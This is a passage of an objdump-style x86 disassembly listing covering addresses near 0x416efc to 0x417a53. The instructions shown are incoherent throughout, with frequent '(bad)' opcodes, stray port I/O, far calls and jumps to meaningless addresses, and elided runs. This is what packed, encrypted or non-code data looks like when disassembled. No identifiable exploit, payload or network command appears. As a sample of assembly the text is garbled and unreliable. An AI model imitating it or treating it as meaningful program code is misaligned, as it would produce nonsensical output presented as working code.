  416efc:	or     BYTE PTR [eax-0x15],dh
  416eff:	pop    edx
  416f00:	ret    
  416f01:	inc    eax
  416f02:	out    0x3,eax
  416f04:	inc    ebp
  416f05:	sbb    edx,DWORD PTR [ecx+ecx*1-0x19]
  416f09:	mov    al,0xe9
  416f0b:	add    edi,DWORD PTR [esi]
  416f0d:	jae    0x416ea7
  416f0f:	int3   
	...
  416f38:	add    BYTE PTR [eax],al
  416f3a:	jle    0x416f97
  416f3c:	(bad)  
  416f3d:	mov    ecx,0xf5eef345
  416f42:	shl    ch,1
  416f44:	bound  edx,QWORD PTR [edx+edi*4-0x21]
  416f48:	mov    bl,0x3b
  416f4a:	shl    ch,0x37
  416f4d:	(bad)  
  416f4e:	mov    eax,ds:0xb042d98e
  416f53:	shr    DWORD PTR [esp+esi*1-0x50],cl
  416f57:	in     eax,0x8e
  416f59:	scas   al,BYTE PTR es:[edi]
  416f5a:	mov    eax,ds:0xfeb1177d
  416f5f:	pop    edx
  416f60:	jle    0x416fdb
  416f62:	mov    eax,ds:0xfd7600ed
  416f67:	in     al,0x73
  416f69:	loope  0x416fc0
  416f6b:	mov    BYTE PTR [edi],ch
  416f6d:	data16 std 
  416f6f:	rol    BYTE PTR [ebx-0x21acab3],cl
  416f75:	ret    
  416f76:	cmp    eax,0x7abc5b73
  416f7b:	in     eax,0xfe
  416f7d:	jl     0x416f91
  416f7f:	in     eax,dx
  416f80:	std    
  416f81:	ds std 
  416f83:	outs   dx,BYTE PTR ds:[esi]
  416f84:	or     BYTE PTR [ecx-0x7f],al
  416f87:	sub    bh,ch
  416f89:	cs mov bl,0xde
  416f8c:	call   0x6b26ecaf
  416f91:	jmp    0xa8acec7b
  416f96:	cmp    eax,0x6519b3e4
  416f9b:	in     eax,0xfd
  416f9d:	push   es
	...
  416fc6:	add    BYTE PTR [eax],al
  416fc8:	xlat   BYTE PTR ds:[ebx]
  416fc9:	pop    esp
  416fca:	call   0xfe277aa0
  416fcf:	pusha  
  416fd0:	mov    bh,0xf8
  416fd2:	cmc    
  416fd3:	out    dx,al
  416fd4:	jl     0x416fad
  416fd6:	add    ebp,0x34
  416fd9:	in     eax,0xfd
  416fdb:	cmp    DWORD PTR [edx+0x42286b6a],esp
  416fe1:	in     al,0xb3
  416fe3:	fldenv [eiz*8+0x5c96c6fd]
  416fea:	call   0xfe273ae0
  416fef:	pusha  
  416ff0:	mov    dh,0x4
  416ff2:	imul   BYTE PTR [esi+0x1100727c]
  416ff8:	clc    
  416ff9:	ja     0x41703a
  416ffb:	jmp    0x9f321efc
  417000:	cld    
  417001:	in     al,0xfd
  417003:	adc    al,0x32
  417005:	repz jmp 0x417008
  417008:	xlat   BYTE PTR ds:[ebx]
  417009:	cdq    
  41700a:	dec    BYTE PTR [ecx-0x97fe6]
  417010:	adc    bl,cl
  417012:	test   al,dl
  417014:	or     BYTE PTR [ecx-0x2c70af02],bl
  41701a:	ins    BYTE PTR es:[edi],dx
  41701b:	inc    ecx
  41701c:	addr16 cdq 
  41701e:	mov    ah,0xf0
  417020:	or     BYTE PTR [ecx+0x508afffe],bl
  417026:	call   0xfedac7f8
  41702b:	mov    DWORD PTR [eax],eax
	...
  417055:	add    dl,bl
  417057:	mov    esi,esi
  417059:	call   DWORD PTR [eax]
  41705b:	mov    dh,0xfd
  41705d:	addr16 out 0xaa,al
  417060:	inc    eax
  417061:	add    BYTE PTR [eax+0x63],ah
  417064:	in     eax,dx
  417065:	not    DWORD PTR [eax-0x67]
  417068:	(bad)  
  417069:	jne    0x41708a
  41706b:	xor    BYTE PTR [edi-0x7766cfd0],ch
  417071:	test   DWORD PTR [ebx+0x21],edx
  417074:	(bad)  
  417075:	jmp    DWORD PTR [edx+0x10f7c1d3]
  41707b:	call   0x40:0xab73684d
  417082:	loopne 0x4170ef
  417084:	in     eax,dx
  417085:	not    DWORD PTR [eax]
  417087:	call   0x308f:0x2fdf75fe
  41708e:	lock cdq 
  417090:	mov    BYTE PTR [ebp-0x1de71],al
  417096:	ins    DWORD PTR es:[edi],dx
  417097:	pop    edi
  417098:	push   0xfe1882a5
  41709d:	dec    BYTE PTR [edx+0x2f]
  4170a0:	idiv   bh
  4170a2:	loopne 0x41703d
  4170a4:	je     0x4170ae
  4170a6:	iret   
  4170a7:	mov    eax,ds:0xcd3eff2d
  4170ac:	mov    DWORD PTR [esi+edi*2-0x3401c034],eax
  4170b3:	jbe    0x417131
  4170b5:	not    BYTE PTR [ecx+0x67d464]
	...
  4170e3:	add    bh,cl
  4170e5:	pop    esi
  4170e6:	sar    edi,0x80
  4170e9:	cs xor al,0xf6
  4170ec:	jns    0x41716a
  4170ee:	aas    
  4170ef:	je     0x417137
  4170f1:	mov    dl,bh
  4170f3:	das    
  4170f4:	imul   ecx,DWORD PTR [ecx+ecx*4+0x3f8ca284],0x30debdfe
  4170ff:	not    BYTE PTR [ecx+0x24]
  417102:	add    al,0xf
  417104:	ret    0x434
  417107:	add    BYTE PTR [esi],bh
  417109:	jno    0x417188
  41710b:	iret   
  41710c:	xor    DWORD PTR [edx],edi
  41710e:	aas    
  41710f:	jmp    FWORD PTR [edx-0x19437b11]
  417115:	inc    ecx
  417116:	aas    
  417117:	(bad)  
  417118:	add    DWORD PTR ds:[esi+0x1f43eb0],eax
  41711f:	push   0xbd30f43e
  417124:	or     DWORD PTR [eax+0x11],esp
  417127:	call   0xfe828cf0
  41712c:	stc    
  41712d:	mov    edi,0x1f1f62d
  417132:	inc    ecx
  417133:	je     0x417183
  417135:	sbb    al,0x10
  417137:	sub    ah,cl
  417139:	adc    DWORD PTR [ecx-0x4c],eax
  41713c:	out    0xa1,al
  41713e:	inc    eax
  41713f:	(bad)  
  417140:	shl    DWORD PTR [edi],1
  417142:	adc    al,0xe8
  417144:	ds pop esi
  417146:	aas    
  417147:	inc    BYTE PTR [eax]
	...
  417171:	add    cl,al
  417173:	addr16 and eax,0xa65bb9f6
  417179:	inc    eax
  41717a:	sub    cl,BYTE PTR [ebx-0x71]
  41717d:	xor    eax,0x4096e256
  417182:	jmp    0x3ce2:0x984096ff
  417189:	and    ecx,DWORD PTR [eax+0x12407ee2]
  41718f:	dec    ebx
  417190:	jg     0x417207
  417192:	push   esi
  417193:	loop   0x417203
  417195:	inc    eax
  417196:	mov    dl,0x3
  417198:	pop    edi
  417199:	inc    eax
  41719a:	jo     0x41717e
  41719c:	aam    0x13
  41719e:	push   esi
  41719f:	or     eax,DWORD PTR [ecx]
  4171a1:	inc    ecx
  4171a2:	pusha  
  4171a3:	loop   0x417139
  4171a5:	push   ebx
  4171a6:	push   eax
  4171a7:	loop   0x4171ef
  4171a9:	inc    eax
  4171aa:	mov    al,BYTE PTR [edi]
  4171ac:	aaa    
  4171ad:	inc    eax
  4171ae:	dec    eax
  4171af:	loop   0x41716d
  4171b1:	adc    edx,DWORD PTR [esi-0x35]
  4171b4:	add    BYTE PTR [ecx+0x38],al
  4171b7:	loop   0x417215
  4171b9:	dec    edi
  4171ba:	sub    dl,ah
  4171bc:	push   ds
  4171bd:	inc    eax
  4171be:	mov    dl,0x4b
  4171c0:	push   DWORD PTR [eax+0x56]
  4171c3:	loop   0x4171d3
  4171c5:	inc    eax
  4171c6:	rcl    BYTE PTR [esi],cl
  4171c8:	(bad)  
  4171c9:	aas    
  4171ca:	adc    dl,ah
  4171cc:	xor    al,0x4b
  4171ce:	adc    dl,ah
  4171d0:	idiv   BYTE PTR [edi]
  4171d2:	mov    cl,BYTE PTR [ebx-0x1]
  4171d5:	mov    al,0x0
	...
  4171ff:	add    BYTE PTR [esi],ah
  417201:	loop   0x4171e9
  417203:	aas    
  417204:	stos   BYTE PTR es:[edi],al
  417205:	sbb    dl,bh
  417207:	aas    
  417208:	call   0xd655ceee
  41720d:	into   
  41720e:	add    BYTE PTR [edi],bh
  417210:	fsub   st,st(1)
  417212:	jl     0x417290
  417214:	enter  0xbee1,0x3f
  417218:	xchg   edx,eax
  417219:	sahf   
  41721a:	add    BYTE PTR [esi+0x34fde101],bh
  417220:	push   edx
  417221:	repz dec esp
  417223:	shl    BYTE PTR [eax-0x1f],1
  417226:	std    
  417227:	adc    al,0x52
  417229:	loop   0x4171de
  41722b:	cdq    
  41722c:	imul   esp,ecx,0x59d78efd
  417232:	call   0xfe2271a2
  417237:	jle    0x417240
  417239:	repnz cmc 
  41723b:	jbe    0x41727e
  41723d:	cli    
  41723e:	inc    edi
  41723f:	mov    ebp,0x9cfde138
  417244:	cs jmp 0x205bd147
  41724a:	sub    al,0x56
  41724c:	and    ecx,esp
  41724e:	mov    bl,0x41
  417250:	adc    ecx,esp
  417252:	std    
  417253:	push   ecx
  417254:	dec    ebp
  417255:	xor    eax,0xa7093efd
  41725a:	in     al,0x3e
  41725c:	add    ecx,esp
  41725e:	call   0xfe23a064
  417263:	add    BYTE PTR es:[eax],al
	...
  41728e:	mov    bh,0x0
  417290:	neg    BYTE PTR [esi]
  417292:	imul   edi,eax,0xe160c51b
  417298:	std    
  417299:	push   esp
  41729a:	jp     0x417285
  41729c:	std    
  41729d:	push   es
  41729e:	bound  ecx,QWORD PTR [edx+0x2c]
  4172a1:	dec    BYTE PTR [eax-0x1f]
  4172a4:	mov    bl,0x1d
  4172a6:	dec    ecx
  4172a7:	loope  0x4172a6
  4172a9:	add    DWORD PTR [ecx+0x2f],eax
  4172ac:	std    
  4172ad:	out    0x30,al
  4172af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172b0:	int3   
  4172b1:	(bad)  
  4172b2:	sub    cl,ah
  4172b4:	call   0xfe23478e
  4172b9:	into   
  4172ba:	push   esi
  4172bb:	sbb    dh,dh
  4172bd:	add    al,bh
  4172bf:	and    ebp,esp
  4172c1:	icebp  
  4172c2:	sub    al,0x20
  4172c4:	(bad)  
  4172c5:	inc    DWORD PTR [edx-0x64]
  4172c8:	idiv   bh
  4172ca:	call   0xd86d5603
  4172cf:	and    esi,edi
  4172d1:	mov    ch,0xb
  4172d3:	sub    esi,edi
  4172d5:	(bad)  
  4172d6:	mov    edi,0xc8ff2a85
  4172db:	and    DWORD PTR [eax+edi*8-0x52],eax
  4172df:	hlt    
  4172e0:	cld    
  4172e1:	dec    DWORD PTR [eax]
  4172e3:	and    DWORD PTR [esp+edi*8-0x41],esi
  4172e7:	sub    DWORD PTR [esi],edx
  4172e9:	add    BYTE PTR [edi-0x71],ah
  4172ec:	mov    edi,0x8b03670c
  4172f1:	in     al,dx
	...
  41731a:	add    BYTE PTR [eax],al
  41731c:	aam    0x97
  41731e:	stc    
  41731f:	push   0x57
  417321:	mov    dl,0x59
  417323:	push   DWORD PTR [edx+0x54]
  417326:	call   0xfe61a318
  41732b:	mov    DWORD PTR [edx+0x5f75fe20],esp
  417331:	mov    ah,0x3a
  417333:	ins    DWORD PTR es:[edi],dx
  417334:	out    0x5b,al
  417336:	std    
  417337:	xor    eax,0x411472
  41733c:	dec    edi
  41733d:	mov    edi,ecx
  41733f:	dec    DWORD PTR [eax+0x21]
  417342:	je     0x41734c
  417344:	mov    edi,0x27416ce4
  417349:	mov    ah,0xff
  41734b:	call   DWORD PTR [edi]
  41734d:	fsubr  st(5),st
  41734f:	mov    ebx,0xfffe1e0b
  417354:	jb     0x417376
  417356:	(bad)  
  417357:	jne    0x417348
  417359:	xor    edi,ebp
  41735b:	sub    BYTE PTR [eax],cl
  41735d:	push   ds
  41735e:	enter  0x3ec2,0xee
  417362:	add    DWORD PTR [ebp-0x3b],edx
  417365:	popf   
  417366:	jg     0x41732b
  417368:	ror    BYTE PTR [ecx+0x5fd90004],cl
  41736e:	lods   al,BYTE PTR ds:[esi]
  41736f:	mov    ebp,0xff043353
  417374:	xor    edi,esi
  417376:	cmp    al,0x74
  417378:	inc    esi
  417379:	retf   0x53d5
  41737c:	test   eax,0xacc0
	...
  4173a9:	add    BYTE PTR [esi],bh
  4173ab:	fnstcw WORD PTR [esi+0x67]
  4173ae:	test   dh,bl
  4173b0:	ret    0x90ff
  4173b3:	fimul  WORD PTR ds:0x29ea13ff
  4173b9:	aas    
  4173ba:	jmp    0x29fd:0xf3fe3b68
  4173c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173c2:	cs jns 0x417400
  4173c5:	or     bh,BYTE PTR [esi+0x5]
  4173c8:	test   DWORD PTR [eax-0x537a05],0x677e2059
  4173d2:	nop
  4173d3:	push   es
  4173d4:	ret    
  4173d5:	dec    DWORD PTR [eax-0x5a]
  4173d8:	cmp    eax,0x29f9cbfe
  4173dd:	sbb    edx,DWORD PTR [edx+0x3f673b2d]
  4173e3:	hlt    
  4173e4:	sub    al,0xbd
  4173e6:	xchg   esi,eax
  4173e7:	sub    ch,BYTE PTR [ebp-0x4abac1c0]
  4173ed:	sti    
  4173ee:	sbb    eax,ecx
  4173f0:	or     eax,ebp
  4173f2:	cmp    eax,eax
  4173f4:	cmp    al,0xfe
  4173f6:	or     DWORD PTR [eax+0x3d],ebp
  4173f9:	out    0x33,eax
  4173fb:	sbb    DWORD PTR ds:0xc3307fe,edi
  417401:	add    BYTE PTR [ebx-0x43d08da5],cl
  417407:	pop    ss
  417408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417409:	test   eax,0xae0876e1
	...
  417436:	add    BYTE PTR [eax],al
  417438:	jle    0x417495
  41743a:	aas    
  41743b:	sub    esp,DWORD PTR [edx-0x64]
  41743e:	out    0x3c,eax
  417440:	push   edx
  417441:	dec    edi
  417442:	iret   
  417443:	add    al,0x10
  417445:	fidiv  WORD PTR [esi-0x2a9881f8]
  41744b:	mov    bh,dl
  41744d:	fisub  WORD PTR [esi+0x14dea5b6]
  417453:	or     al,0x96
  417455:	jle    0x4173ed
  417457:	cmp    al,0x98
  417459:	ficom  WORD PTR [eax+eax*2]
  41745c:	cdq    
  41745d:	or     dl,dl
  41745f:	cmp    al,0x88
  417461:	jno    0x41744a
  417463:	stos   DWORD PTR es:[edi],eax
  417464:	dec    esp
  417465:	ins    DWORD PTR es:[edi],dx
  417466:	sub    BYTE PTR [esi+eiz*8],al
  417469:	repz cld 
  41746b:	ret    0xdd71
  41746e:	fmul   QWORD PTR [edi]
  417470:	push   esi
  417471:	add    al,0xd
  417473:	cmp    eax,0xb7275260
  417478:	xor    edx,esp
  41747a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41747b:	aas    
  41747c:	push   eax
  41747d:	push   0x52d23c43
  417482:	dec    edi
  417483:	repnz inc eax
  417485:	fidiv  WORD PTR [esi]
  417487:	cmp    al,0xb2
  417489:	fistp  QWORD PTR [edi]
  41748b:	fisub  WORD PTR fs:0x29a9
  417491:	jbe    0x417436
  417493:	lods   eax,DWORD PTR ds:[esi]
  417494:	jle    0x4174f1
  417496:	jg     0x4174d4
  417498:	stos   BYTE PTR es:[edi],al
  417499:	pushf  
  41749a:	out    0x3c,eax
	...
  4174c4:	add    BYTE PTR [eax],al
  4174c6:	mov    cl,BYTE PTR [edi+0xf]
  4174c9:	push   0x7fede5a
  4174ce:	(bad)  
  4174cf:	data16 add bh,bl
  4174d2:	les    edx,FWORD PTR [esi-0x1e541104]
  4174d8:	std    
  4174d9:	pop    esp
  4174da:	cmp    dh,bl
  4174dc:	add    esi,ebx
  4174de:	and    eax,0x165cfddd
  4174e3:	div    BYTE PTR [edi+0x3]
  4174e6:	adc    eax,0xe2c8bdd
  4174eb:	mov    gs,WORD PTR [eax-0x1]
  4174ee:	xchg   edi,eax
  4174ef:	call   0xe93f:0x6f754100
  4174f6:	je     0x41755f
  4174f8:	or     al,0x91
  4174fa:	jmp    0x31e0722d
  4174ff:	sbb    esi,DWORD PTR [ebp+0x10]
  417502:	retf   
  417503:	xchg   esi,eax
  417504:	clc    
  417505:	push   0xffffffd7
  417507:	jmp    0xd1177110
  41750c:	inc    ebx
  41750d:	xor    DWORD PTR [ecx+0x5cd93cdd],0x3ef7fddd
  417517:	mov    ds:0x5b420e10,eax
  41751c:	xchg   DWORD PTR [ebp+ebp*1-0x70a9b30f],esp
  417523:	in     eax,dx
  417524:	push   0x9aa79d
  417529:	je     0x41752b
	...
  417553:	add    BYTE PTR [edi+0x15],bh
  417556:	push   ecx
  417557:	push   ecx
  417558:	jae    0x4175a1
  41755a:	add    cl,ch
  41755c:	rcr    BYTE PTR [eax],0xd
  41755f:	pop    esp
  417560:	call   FWORD PTR [eax]
  417562:	push   ecx
  417563:	je     0x417564
  417565:	adc    al,0x51
  417567:	xchg   ecx,eax
  417568:	outs   dx,DWORD PTR fs:[esi]
  41756a:	aas    
  41756b:	jmp    0x14ddcc4
  417570:	and    eax,0x4000fd30
  417575:	dec    esp
  417576:	shl    BYTE PTR [ebx+eiz*8-0x31],0x44
  41757b:	cld    
  41757c:	mov    fs:0x4d6903c1,al
  417582:	std    
  417583:	jne    0x417568
  417585:	and    DWORD PTR [eax+ecx*1+0xf],esi
  417589:	fdivr  st,st(3)
  41758b:	push   eax
  41758d:	and    DWORD PTR [esp+edi*8-0x1],esi
  417591:	sub    DWORD PTR [eax],ebp
  417593:	inc    DWORD PTR [eax]
  417595:	and    cl,BYTE PTR [eax+esi*8+0x54]
  417599:	mov    ds:0x717a00ed,eax
  41759e:	(bad)  
  41759f:	jne    0x417590
  4175a1:	xor    bl,ah
  4175a3:	sub    eax,esp
  4175a5:	and    eax,ecx
  4175a7:	ret    0x58af
  4175aa:	push   ebx
  4175ab:	mov    eax,ebx
  4175ad:	aad    0xc1
  4175af:	cld    
  4175b0:	cmp    eax,0xc05d6a57
  4175b5:	stos   DWORD PTR es:[edi],eax
  4175b6:	add    eax,0xe8
	...
  4175df:	add    BYTE PTR [eax],al
  4175e1:	add    BYTE PTR [edi-0x21000107],cl
  4175e7:	sbb    bh,dl
  4175e9:	push   0xbeed5867
  4175ee:	(bad)  
  4175ef:	bound  ebp,QWORD PTR [ecx+eax*2+0x57]
  4175f3:	mov    al,0xd3
  4175f5:	ins    DWORD PTR es:[edi],dx
  4175f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175f7:	pop    eax
  4175f8:	std    
  4175f9:	jne    0x41765a
  4175fb:	xor    dl,dh
  4175fd:	push   edx
  4175fe:	add    BYTE PTR [ecx],ah
  417600:	add    DWORD PTR gs:[edi+0x31],edx
  417604:	mov    ebx,0x40b35d68
  417609:	add    bh,bh
  41760b:	mov    DWORD PTR [ecx+eax*2+0x17],ebp
  41760f:	and    DWORD PTR [eax+ecx*1+0x4f],esi
  417613:	test   BYTE PTR [edi-0x1],cl
  417616:	ds inc ebp
  417618:	test   eax,0x78dd11ff
  41761d:	addr16 enter 0xc4c6,0xff
  417622:	cdq    
  417623:	cmp    eax,0xe53e40a8
  417628:	lods   eax,DWORD PTR ds:[esi]
  417629:	pop    es
  41762a:	out    0x36,al
  41762c:	sar    esi,cl
  41762e:	jmp    0xd14177bc
  417633:	mov    ebx,0x336bc9ac
  417638:	add    al,0x68
  41763a:	icebp  
  41763b:	push   ds
  41763c:	sar    edi,0xc8
  41763f:	push   ds
  417640:	or     al,0xe8
  417642:	nop
  417643:	aas    
  417644:	aaa    
  417645:	inc    BYTE PTR [eax]
	...
  41766f:	add    BYTE PTR [ecx-0xb8b122],bh
  417675:	icebp  
  417676:	cmp    BYTE PTR [esi+esi*1-0x36],dh
  41767a:	fdivp  st(5),st
  41767c:	mov    eax,ds:0x3e01acbc
  417681:	repnz cmp esi,0x4c29fa0b
  417688:	mov    ah,dl
  41768a:	aaa    
  41768b:	dec    BYTE PTR [ebx]
  41768d:	pop    esi
  41768e:	aaa    
  41768f:	je     0x4176d7
  417691:	fimul  DWORD PTR [ecx+0x25]
  417694:	jno    0x417702
  417696:	dec    ecx
  417697:	rol    DWORD PTR [edx-0xe],0xce
  41769b:	mov    dl,BYTE PTR [edx+0x70]
  41769e:	inc    eax
  41769f:	sti    
  4176a0:	pop    ecx
  4176a1:	dec    BYTE PTR ds:0x29e1cbff
  4176a7:	xchg   edi,eax
  4176a8:	pop    es
  4176a9:	xchg   ebp,eax
  4176aa:	aaa    
  4176ab:	or     bh,BYTE PTR [esi-0x5b]
  4176ae:	repnz mov BYTE PTR [ebx+0x56743790],al
  4176b5:	mov    DWORD PTR [ebp+0x3c5c1607],ebp
  4176bb:	fbld   TBYTE PTR [eax]
  4176bd:	fistp  DWORD PTR [esi]
  4176bf:	scas   eax,DWORD PTR es:[edi]
  4176c0:	inc    ebp
  4176c1:	ficomp DWORD PTR [ebx+ecx*1+0x38c58826]
  4176c8:	or     bl,bl
  4176ca:	jl     0x417703
  4176cc:	add    BYTE PTR [ecx-0x11],dl
  4176cf:	sub    ebx,DWORD PTR [esi]
  4176d1:	xor    esi,0x38
	...
  4176fb:	add    BYTE PTR [eax],al
  4176fd:	add    al,dh
  4176ff:	push   eax
  417700:	jmp    0x41772d
  417702:	inc    ebx
  417703:	test   dh,ah
  417705:	cmp    BYTE PTR [ecx+0x3e03e75c],ch
  41770b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41770c:	test   eax,0x62303e0f
  417711:	daa    
  417712:	mov    esp,0x6bd0bf9f
  417717:	adc    bl,BYTE PTR cs:[ebp-0x8]
  41771b:	das    
  41771c:	inc    ebp
  41771d:	ret    
  41771e:	mov    cl,0xe7
  417720:	and    al,0x38
  417722:	stc    
  417723:	xor    DWORD PTR [esi+0x14da31ae],esp
  417729:	or     BYTE PTR [esi-0x6fc73d30],ah
  41772f:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  417731:	scas   eax,DWORD PTR es:[edi]
  417732:	daa    
  417733:	sub    ecx,DWORD PTR [edi]
  417735:	add    al,0x3e
  417737:	retf   0x383d
  41773a:	repnz (bad) 
  41773c:	pop    ss
  41773d:	shl    DWORD PTR [eax+0x50],1
  417740:	fild   QWORD PTR [ebx]
  417742:	call   0x3479de20
  417747:	mov    bl,0x4f
  417749:	js     0x41776c
  41774b:	ficom  DWORD PTR [esi+0x37]
  41774e:	or     al,0x9b
  417750:	nop
  417751:	cmp    BYTE PTR [eax-0x26],cl
  417754:	inc    esi
  417755:	xor    eax,0xaee69393
  41775a:	std    
  41775b:	sbb    DWORD PTR [ecx],eax
  41775d:	into   
  41775e:	out    0x1a,al
  417760:	add    BYTE PTR [eax+eax*1+0x0],bl
	...
  41778c:	call   0x66ffc866
  417791:	dec    edi
  417792:	adc    BYTE PTR [esi],bl
  417794:	call   0x229f5ffe
  417799:	fscale 
  41779b:	loop   0x41781a
  41779d:	dec    esi
  41779e:	xor    BYTE PTR [ecx-0x6e07e14c],bl
  4177a4:	inc    edx
  4177a5:	pop    ebx
  4177a6:	in     eax,dx
  4177a7:	aaa    
  4177a8:	ss dec edi
  4177aa:	or     BYTE PTR [ecx],al
  4177ac:	in     eax,0x7e
  4177ae:	std    
  4177af:	out    0xf1,al
  4177b1:	fdiv   DWORD PTR [ebx-0xf]
  4177b4:	and    eax,0x9d623eb
  4177b9:	fnstenv [ebx-0x33]
  4177bc:	adc    DWORD PTR [edi-0x8],ecx
  4177bf:	(bad)  
  4177c0:	(bad)  
  4177c1:	popa   
  4177c2:	call   0xfe1a16dd
  4177c7:	shl    ebp,0x81
  4177ca:	std    
  4177cb:	scas   al,BYTE PTR es:[edi]
  4177cc:	mov    ebp,0xada4ffa4
  4177d1:	sbb    DWORD PTR [eax-0x226ae62],edi
  4177d7:	fwait
  4177d8:	sbb    BYTE PTR [edx+0x19201405],dl
  4177de:	mov    dh,0x16
  4177e0:	jnp    0x4177bb
  4177e2:	mov    WORD PTR [esi+esi*1],fs
  4177e5:	sub    dl,BYTE PTR [ebp+0x76]
  4177e8:	scas   eax,DWORD PTR es:[edi]
  4177e9:	imul   edi,ebp,0x5bc341f4
  4177ef:	adc    al,BYTE PTR [eax]
	...
  417819:	add    BYTE PTR [ecx],ch
  41781b:	(bad)  [ecx]
  41781d:	sub    DWORD PTR [esi+0xa625033],ecx
  417823:	fnstsw WORD PTR [ebx+0x4d]
  417826:	inc    ebx
  417827:	push   ecx
  417828:	dec    esp
  417829:	add    bh,dl
  41782b:	rol    BYTE PTR [eax],1
  41782d:	jne    0x41784c
  41782f:	pop    ss
  417830:	dec    DWORD PTR [ebp+0x6b]
  417833:	pop    es
  417834:	add    DWORD PTR [eax],eax
  417836:	push   0x5b75fe51
  41783b:	test   eax,0x64b2ff56
  417840:	call   0xfed1a21b
  417845:	or     ecx,DWORD PTR [edi-0x7c]
  417848:	sub    al,0x80
  41784a:	stc    
  41784b:	pop    edx
  41784c:	jae    0x417876
  41784e:	mov    eax,ds:0xbdfc4c91
  417853:	pop    esp
  417854:	mov    eax,DWORD PTR [ebp-0x25]
  417857:	lods   al,BYTE PTR ds:[esi]
  417858:	push   ebx
  417859:	call   0x4027b4
  41785e:	int3   
  41785f:	sbb    al,0x71
  417861:	adc    al,0x7f
  417863:	pop    ebp
  417864:	add    bh,ch
  417866:	mov    ecx,0x21fc7491
  41786b:	test   al,0xfe
  41786d:	jne    0x41781e
  41786f:	test   BYTE PTR [esi+0xa91e8fe],ah
  417875:	fdivr  DWORD PTR [edi+0x79]
  417878:	es (bad) 
  41787a:	fcom   DWORD PTR [eax+0xc032]
	...
  4178a8:	push   ds
  4178a9:	xchg   ecx,eax
  4178aa:	(bad)  
  4178ab:	jmp    FWORD PTR [eax-0x5fc75476]
  4178b1:	or     eax,DWORD PTR [edx+0x41004fbf]
  4178b7:	add    dl,ch
  4178b9:	call   0x1074:0x905050f9
  4178c0:	fmul   DWORD PTR [edx]
  4178c2:	or     ch,al
  4178c4:	sti    
  4178c5:	sar    esi,0xff
  4178c8:	dec    esp
  4178c9:	sbb    al,0x71
  4178cb:	xor    BYTE PTR [esi],bh
  4178cd:	adc    cl,BYTE PTR [ebp-0x265b9bc]
  4178d3:	call   DWORD PTR [eax-0x20]
  4178d6:	ss je  0x41791f
  4178d9:	sub    ah,BYTE PTR [ecx-0x316ecedd]
  4178df:	(bad)  
  4178e0:	mov    bl,0xba
  4178e2:	sub    DWORD PTR [eax-0x1c97ea6],edi
  4178e8:	xchg   ebx,eax
  4178e9:	jbe    0x417921
  4178eb:	je     0x417903
  4178ed:	jno    0x41789f
  4178ef:	pop    es
  4178f0:	push   ss
  4178f1:	jmp    0x6a4377d3
  4178f6:	xchg   edx,eax
  4178f7:	es stc 
  4178f9:	fdivr  DWORD PTR [edi-0x36]
  4178fc:	aas    
  4178fd:	into   
  4178fe:	out    dx,eax
  4178ff:	mov    edi,0xfe33c8a7
  417904:	loope  0x4178b9
  417906:	data16 aaa 
  417908:	inc    ecx
  417909:	das    
  41790a:	data16 or al,BYTE PTR [eax]
	...
  417935:	add    ch,dh
  417937:	xor    eax,0xc22e6805
  41793c:	and    al,0xbd
  41793e:	rcl    DWORD PTR [esi+0x5e5ce80c],0x33
  417945:	inc    ch
  417947:	add    al,0xd8
  417949:	pop    ebp
  41794a:	or     ebx,edi
  41794c:	inc    edx
  41794d:	(bad)  
  41794f:	xchg   edi,eax
  417950:	xchg   ebx,ebp
  417952:	mov    edi,0x91f634fd
  417957:	lock test DWORD PTR [edx+ecx*4-0x6f],eax
  41795c:	xor    esi,DWORD PTR [esi+ebp*1-0x1f]
  417960:	lods   eax,DWORD PTR ds:[esi]
  417961:	or     esp,DWORD PTR [esi+0x43]
  417964:	(bad)  
  417966:	ds mov ebp,0xe97441
  41796c:	mov    esi,0xe75b3ef7
  417971:	add    edi,DWORD PTR [esi]
  417973:	mov    al,ds:0x5f502fa4
  417978:	out    0x3,eax
  41797a:	aam    0x5a
  41797c:	rol    DWORD PTR [ebx],0xd4
  41797f:	pop    edx
  417980:	rol    DWORD PTR [ebx],1
  417982:	retf   
  417983:	and    BYTE PTR [ebx],dh
  417985:	aam    0xc2
  417987:	loopne 0x4179c4
  417989:	sub    eax,0x3497d728
  41798e:	stos   BYTE PTR es:[edi],al
  41798f:	shl    DWORD PTR [esi],cl
  417991:	scas   eax,DWORD PTR es:[edi]
  417992:	adc    eax,0x3e10bfc4
  417997:	pop    ebx
  417998:	loop   0x4179dd
	...
  4179c2:	add    BYTE PTR [eax],al
  4179c4:	lea    ebx,[ecx+0x2]
  4179c7:	mov    edi,0xc2b00c99
  4179cc:	stc    
  4179cd:	aad    0x74
  4179cf:	adc    esp,esi
  4179d1:	pop    es
  4179d2:	ret    0xe834
  4179d5:	loop   0x4179ee
  4179d7:	xchg   DWORD PTR [edx-0x27cb2131],edi
  4179dd:	sub    edi,DWORD PTR [ecx]
  4179df:	sub    al,0xce
  4179e1:	adc    esi,0xd7e0b634
  4179e7:	sub    al,0xc0
  4179e9:	(bad)  
  4179ea:	push   ecx
  4179eb:	add    al,0xb9
  4179ed:	adc    BYTE PTR [eax-0x49294fd4],bh
  4179f3:	scas   al,BYTE PTR es:[edi]
  4179f4:	xor    eax,0x960c34d6
  4179f9:	ret    
  4179fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179fb:	xor    al,0x98
  4179fd:	(bad)  
  4179fe:	push   esp
  4179ff:	xor    ecx,DWORD PTR [eax+0x672b96d6]
  417a05:	jge    0x417995
  417a07:	xor    al,0x80
  417a09:	and    BYTE PTR [edi+0x28],bh
  417a0c:	leave  
  417a0d:	(bad)  
  417a0e:	hlt    
  417a0f:	aaa    
  417a10:	pop    ecx
  417a11:	aam    0x0
  417a13:	fstp   TBYTE PTR ds:0x39abc75b
  417a19:	pop    ebx
  417a1a:	push   ebx
  417a1b:	jb     0x417a3e
  417a1d:	fcmovnb st,st(4)
  417a1f:	pop    ecx
  417a20:	and    dl,ch
  417a22:	std    
  417a23:	fs mov dl,dl
  417a26:	push   eax
  417a27:	dec    esi
	...
  417a50:	add    BYTE PTR [eax],al
  417a52:	nop
  417a53:	data16 std 
